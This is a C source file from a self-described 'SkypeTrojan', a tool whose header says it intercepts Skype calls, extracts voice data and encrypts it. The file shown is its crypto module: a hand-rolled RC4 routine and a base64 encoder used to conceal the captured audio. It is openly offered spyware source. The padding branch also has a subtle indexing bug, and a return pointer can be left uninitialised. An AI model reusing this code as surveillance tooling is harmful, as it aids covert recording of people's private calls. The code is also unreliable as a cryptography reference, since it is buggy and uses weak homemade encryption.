/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */




/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */



#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <Lm.h>
#include "VoIP_Recorder.h"
#include "crypto.h"


unsigned char gB64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char sBox[SBOX_SIZE + 1];






/*
 * Encode a string to base64 and encrypt it.
 *
 */

char *encryptAndEncode(int pSize, char *pSrc, int *pOutputLength, char *pKey)
{
  char *mRetPointer;
  unsigned char mDecoded1 = 0, mDecoded2 = 0, mDecoded3 = 0, mDecoded4 = 0, mDecoded5 = 0, mDecoded6 = 0, mDecoded7 = 0;
  char *mEncryptedData = NULL;
  int mEncryptedDataSize = 0;
  int mLength2 = 0;
  char *mDecryptedData = NULL;
  int mEncryptedSubCounter = 0;
  int mCounter2 = 0;
  int mCounter = 0;
  unsigned char mDecodedChunk[DECODED_CHUNK_SIZE], mEncodedChunk[ENCODED_CHUNK_SIZE];

  if(!pSrc)
    goto END;

  if(!pSize)
    pSize = strlen((char *) pSrc);

  *pOutputLength = 0;







  if ((mEncryptedData = (char *) HeapAlloc(GetProcessHeap(), 0 , pSize * 2)) == NULL)
    goto END;

  ZeroMemory(mEncryptedData, pSize * 2);



  /*
   * Crypto can be enabled or disabled for debugging purposes.
   *
   */

  if (CRYPTO_ON)
  {
    if (strlen(pKey) > 0)
      encrypt((unsigned char *) pKey, (unsigned char *) pSrc, pSize, (unsigned char *) mEncryptedData, pSize * 2, &mEncryptedDataSize);

    if(! (mRetPointer = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(char) * ((int)(mEncryptedDataSize * 4/3) +4)  )))
      goto END;
  } else {
    memcpy(mEncryptedData, pSrc, pSize);
    mEncryptedDataSize = pSize;

    if(! (mRetPointer = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(char) * ((int)(pSize * 4/3) +4)  )))
      goto END;
  } // if (CRYPTO_ON)





  /*
   * Encode encrypted data to base 64.
   *
   */

  for(mEncryptedSubCounter = 0, mCounter = 0, mCounter2 = 0; mEncryptedSubCounter < mEncryptedDataSize; mEncryptedSubCounter++)
  {
    mDecodedChunk[mCounter++] = mEncryptedData[mEncryptedSubCounter];
    if (mCounter == DECODED_CHUNK_SIZE)
    {
      /* transforms 3 * 8 to 4 * 6 bit */
      mEncodedChunk[0] = (mDecodedChunk[0] & 0xfc) >> 2;
      mEncodedChunk[1] = ((mDecodedChunk[0] & 0x03) << 4) + ((mDecodedChunk[1] & 0xf0) >> 4);
      mEncodedChunk[2] = ((mDecodedChunk[1] & 0x0f) << 2) + ((mDecodedChunk[2] & 0xc0) >> 6);
      mEncodedChunk[3] = mDecodedChunk[2] & 0x3f;

      // translates into base64 chars
      for(mCounter = 0; mCounter < ENCODED_CHUNK_SIZE; mCounter++)
      {
        mRetPointer[*pOutputLength] = gB64Table[mEncodedChunk[mCounter]];
       *pOutputLength += 1;
      } // for(mCounter = 0; mCounter < ENCODED_CHUNK_SIZE; mCounter++)

      mCounter = 0;
    }  // if (mCounter == DECODED_CHUNK_SIZE)
  } // for(mEncryptedSubCounter = 0, mCounter = 0, mCounter2 = 0; mEncryptedSubCounter < mCipherTextLength; mEncryptedSubCounter++)



  // if the number of characters were not a multiple of 3
  if (mCounter)
  {
    // fill the rest up with zeros
    for(mCounter2 = mCounter; mCounter2 < 3; mCounter2++)
      mDecodedChunk[mCounter2] = '\0';


    mEncodedChunk[0] = (mDecodedChunk[0] & 0xfc) >> 2;
    mEncodedChunk[1] = ((mDecodedChunk[0] & 0x03) << 4) + ((mDecodedChunk[1] & 0xf0) >> 4);
    mEncodedChunk[2] = ((mDecodedChunk[1] & 0x0f) << 2) + ((mDecodedChunk[2] & 0xc0) >> 6);
    mEncodedChunk[3] = mDecodedChunk[2] & 0x3f;

    // dito
    for (mCounter2 = 0; mCounter2 < mCounter + 1; mCounter2++)
    {
      mRetPointer[*pOutputLength] = gB64Table[mEncodedChunk[mCounter]];
      *pOutputLength += 1;
    } // for (mCounter2 = 0; mCounter2 < mCounter + 1; mCounter2++)


    // pad to 4 chars with = 
    while(mCounter++ < 3)
    {
      mRetPointer[*pOutputLength] = '=';
      *pOutputLength += 1;
    } // while(mCounter++ < 3)
  } // if (mCounter)


END:

  if (mEncryptedData != NULL)
    HeapFree(GetProcessHeap(), 0, mEncryptedData);

  return(mRetPointer);
}




/*
 *
 *
 */

int encrypt(unsigned char *pKey, unsigned char *pPlainText, int pPlainTextLength, unsigned char *pCipherText, int pMaxCipherTextLength, int *pOutputLength)
{
  int c = 0;
  int i = 0;
  int j = 0;
  int t = 0;
  char *mPlainText = NULL;
  unsigned char _key[MAX_BUF_SIZE + 1];
  int mRetVal = 0;


  if ((mPlainText = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pPlainTextLength + 1)) == NULL)
  {
    mRetVal = 1;
    goto END;
  }


  ZeroMemory(_key, sizeof(_key));

  memcpy((char *) _key, (char *) pKey, sizeof(_key) - 1);
  memcpy((char *) mPlainText, (char *) pPlainText, pPlainTextLength);

  preparekey(_key);
  *pOutputLength = 0;


  for (c = 0; c < pPlainTextLength && c < pMaxCipherTextLength; c++)
  {
    i = (i + 1) % 256;
    j = (j + sBox[i]) % 256;
    t = sBox[i];
    sBox[i] = sBox[j];
    sBox[j] = t;

    t = (sBox[i] + sBox[j]) % 256;
    pCipherText[c] = mPlainText[c] ^ sBox[t];
  }

  *pOutputLength = c;

END:

  if (mPlainText != NULL)
    HeapFree(GetProcessHeap(), 0, mPlainText);

  return(mRetVal);
}






/*
 *
 *
 */

int preparekey(unsigned char *pKey)
{
  int mLen = 0;
  int i = 0;
  int j = 0;
  int t = 0;

  mLen = strlen((const char *) pKey);

  for (i = 0; i < 256; i++)
    sBox[i] = i;

  for (i = 0; i < 256; i++)
  {
    j = (j + sBox[i] + pKey[i % mLen]) % 256;
    t = sBox[i];
    sBox[i] = sBox[j];
    sBox[j] = t;
  }
  return(0);
}



/*
 * Encode a character to base64.
 *
 */

static char encode(unsigned char u) 
{
  if(u < 26)  return('A' + u);
  if(u < 52)  return('a' + (u - 26));
  if(u < 62)  return('0' + (u - 52));
  if(u == 62) return('+');

  return('/');
}